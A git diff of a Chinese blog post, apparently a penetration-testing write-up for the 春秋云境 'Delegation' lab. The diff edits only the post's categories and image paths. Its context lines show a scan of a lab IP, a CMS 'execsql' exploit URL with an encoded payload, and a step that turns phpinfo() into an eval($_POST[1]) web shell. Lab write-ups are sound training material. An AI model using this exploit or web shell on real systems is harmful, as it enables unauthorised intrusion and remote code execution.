@@ -3,9 +3,7 @@ typora-root-url: 春秋云境Delegation
 title: 春秋云境Delegation
 toc: true
 categories:
-  - 技术
-  - web
-  - wp
+  - 渗透测试
 date: 2025-03-08 22:15:08
 tags: 
   - 渗透测试
@@ -47,7 +45,7 @@ E:\Users\tiand>fscan  -h 39.98.124.53
 
 ## 入口点
 
-![image-20260308200339209](/image-20260308200339209.png)
+![image-20260308200339209](image-20260308200339209.png)
 
 ```
 http://39.98.124.53/?case=crossall&act=execsql&sql=Ud-ZGLMFKBOhqavNJNK5WRCu9igJtYN1rVCO8hMFRM8NIKe6qmhRfWexXUiOqRN4aCe9aUie4Rtw5
@@ -70,7 +68,7 @@ Session completed.
 
 http://39.98.124.53/index.php?case=user&act=login登录成功
 
-![image-20260308213007832](/image-20260308213007832.png)
+![image-20260308213007832](image-20260308213007832.png)
 
 phpinfo()改成eval($_POST[1])
 
